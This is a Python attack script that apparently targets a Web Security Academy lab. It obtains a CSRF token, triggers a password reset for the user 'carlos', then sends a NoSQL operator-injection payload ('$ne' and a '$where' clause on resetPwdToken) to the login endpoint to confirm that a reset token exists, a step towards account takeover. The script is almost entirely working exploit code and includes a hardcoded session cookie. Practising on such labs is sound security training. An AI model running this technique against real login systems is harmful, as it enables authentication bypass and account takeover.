#!/usr/bin/env python3
import requests

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/forgot-password"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/x-www-form-urlencoded"
}

# First get the CSRF token
get_response = requests.get(url.replace("/forgot-password", "/forgot-password"), headers={"Cookie": headers["Cookie"]})
csrf_start = get_response.text.find('name="csrf" value="') + len('name="csrf" value="')
csrf_end = get_response.text.find('"', csrf_start)
csrf_token = get_response.text[csrf_start:csrf_end]

print(f"CSRF token: {csrf_token}")

# Trigger password reset
data = f"csrf={csrf_token}&username=carlos"
response = requests.post(url, headers=headers, data=data)

print(f"Status code: {response.status_code}")
if "reset link" in response.text.lower() or "email" in response.text.lower():
    print("Password reset triggered successfully!")
else:
    print("Response excerpt:", response.text[:500])

# Now check if carlos has a resetPwdToken
login_url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
payload = {
    "username": "carlos",
    "password": {"$ne": "invalid"},
    "$where": "this.resetPwdToken"
}

check_response = requests.post(login_url, headers={"Cookie": headers["Cookie"], "Content-Type": "application/json"}, json=payload)
if "Account locked" in check_response.text:
    print("\n✓ Carlos now has a resetPwdToken!")
else:
    print("\n✗ No resetPwdToken found for carlos")